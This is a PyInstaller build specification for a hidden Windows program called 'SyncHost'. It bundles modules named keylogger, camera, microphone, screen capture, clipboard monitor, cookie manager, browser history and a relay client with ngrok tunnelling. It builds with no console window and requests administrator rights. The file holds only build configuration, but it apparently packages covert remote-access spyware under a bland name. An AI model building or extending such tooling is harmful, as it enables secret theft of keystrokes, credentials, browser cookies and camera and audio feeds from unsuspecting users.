# -*- mode: python ; coding: utf-8 -*-
import os
import sys
from PyInstaller.utils.hooks import collect_all, collect_data_files

block_cipher = None

# ── Collect everything for packages with heavy dynamic imports ────────────────
_datas    = []
_binaries = []
_hidden   = []

for _pkg in [
    'flask', 'flask_socketio', 'engineio', 'socketio',
    'jinja2', 'werkzeug', 'click', 'itsdangerous', 'markupsafe',
    'pynput', 'cv2', 'PIL',
    'webview', 'pywebview',
    'Cryptodome',
    'mss',
    'av',
    'aiortc',
    'aioice',
    'pyee',
    'cryptography',
    'OpenSSL',
    'cffi',
    'google',
]:
    try:
        d, b, h = collect_all(_pkg)
        _datas    += d
        _binaries += b
        _hidden   += h
    except Exception:
        pass

# ── tkinter: must copy TCL/TK runtime explicitly on Windows ──────────────────
# collect_all() does not work for stdlib modules; we copy the folders directly.
_tcl_base = os.path.join(sys.base_prefix, 'tcl')
if os.path.isdir(_tcl_base):
    for _sub in os.listdir(_tcl_base):
        _sub_path = os.path.join(_tcl_base, _sub)
        if os.path.isdir(_sub_path):
            _datas.append((_sub_path, _sub))

_dll_dir = os.path.join(sys.base_prefix, 'DLLs')
for _dll_name in ['tcl86t.dll', 'tk86t.dll', 'tcl86.dll', 'tk86.dll',
                  '_tkinter.pyd']:
    _dll_path = os.path.join(_dll_dir, _dll_name)
    if os.path.isfile(_dll_path):
        _binaries.append((_dll_path, '.'))

# SSL certificates — needed by requests / pyngrok / updater
_datas += collect_data_files('certifi')

# sounddevice ships portaudio DLL as package data on Windows
try:
    _datas += collect_data_files('sounddevice')
except Exception:
    pass

# pyaudio portaudio DLL (bundled inside the wheel on Windows)
try:
    _datas += collect_data_files('pyaudio')
except Exception:
    pass

# ── Analysis ──────────────────────────────────────────────────────────────────
a = Analysis(
    ['app.py'],
    pathex=[],
    binaries=_binaries,
    datas=[
        ('templates/viewer.html', 'templates'),
    ] + _datas,
    hiddenimports=_hidden + [
        # Flask / SocketIO (belt-and-suspenders on top of collect_all)
        'flask_socketio',
        'engineio',
        'engineio.async_drivers',
        'engineio.async_drivers.threading',
        'socketio',
        'socketio.exceptions',
        # pynput Windows backend
        'pynput',
        'pynput.keyboard',
        'pynput.keyboard._win32',
        'pynput.mouse',
        'pynput.mouse._win32',
        # pywin32
        'win32api', 'win32con', 'win32gui',
        'win32process', 'win32security', 'win32crypt',
        'winerror', 'pywintypes',
        # crypto
        'Cryptodome', 'Cryptodome.Cipher', 'Cryptodome.Cipher.AES',
        'Cryptodome.Protocol', 'Cryptodome.Protocol.KDF',
        # image / screen capture
        'mss', 'mss.windows',
        'cv2', 'numpy',
        'PIL', 'PIL.Image', 'PIL.ImageTk', 'PIL.ImageDraw',
        # audio
        'pyaudio', 'sounddevice',
        # misc stdlib / third-party
        'psutil', 'pyperclip', 'pyngrok',
        'sqlite3', 'pyautogui', 'requests',
        'configparser',
        # tkinter (needed by privacy_screen; try/except fools PyInstaller's tracer)
        'tkinter', '_tkinter', 'tkinter.ttk', 'tkinter.constants',
        'tkinter.filedialog', 'tkinter.messagebox',
        # project modules
        'keylogger', 'screencap', 'controller', 'recorder',
        'camera', 'clipboard_monitor', 'microphone',
        'relay_client', 'server', 'fastcap_host', 'fastcap',
        'file_manager', 'processes', 'cookie_manager', 'browser_history',
        'windows_control', 'wintools', 'sysinfo',
        'privacy_screen', 'webview', 'webview.platforms.winforms',
        'updater',
        # WebRTC
        'webrtc_handler',
        'aiortc', 'aiortc.codecs', 'aiortc.codecs.h264', 'aiortc.codecs.vpx',
        'aiortc.codecs.opus', 'aiortc.mediastreams', 'aiortc.rtcdtlstransport',
        'aiortc.rtcicetransport', 'aiortc.rtcpeerconnection',
        'aioice', 'aioice.stun', 'pyee', 'pyee.asyncio',
        'av', 'av.video', 'av.video.frame', 'av.video.reformatter',
        'fractions',
        # aiortc deps (DTLS/crypto)
        'cryptography', 'cryptography.hazmat', 'cryptography.hazmat.bindings',
        'cryptography.hazmat.bindings._rust',
        'cryptography.hazmat.primitives',
        'cryptography.hazmat.primitives.asymmetric',
        'cryptography.hazmat.backends',
        'OpenSSL', 'OpenSSL.SSL', 'OpenSSL.crypto',
        'cffi', '_cffi_backend',
        'google.crc32c',
    ],
    hookspath=[],
    runtime_hooks=[],
    excludes=[],
    win_no_prefer_redirects=False,
    win_private_assemblies=False,
    cipher=block_cipher,
    noarchive=False,
)

pyz = PYZ(a.pure, a.zipped_data, cipher=block_cipher)

exe = EXE(
    pyz,
    a.scripts,
    a.binaries,
    a.zipfiles,
    a.datas,
    [],
    name='SyncHost',
    debug=False,
    bootloader_ignore_signals=False,
    strip=False,
    upx=True,
    # Don't UPX-compress DLLs — UPX can corrupt certain signed DLLs
    upx_exclude=['vcruntime140.dll', 'python3*.dll', 'cv2*.pyd',
                 '_sounddevice*.pyd', '*.dll'],
    runtime_tmpdir=None,
    console=False,
    disable_windowed_traceback=False,
    target_arch=None,
    codesign_identity=None,
    entitlements_file=None,
    icon=None,
    uac_admin=True,
    manifest='admin.manifest',
)
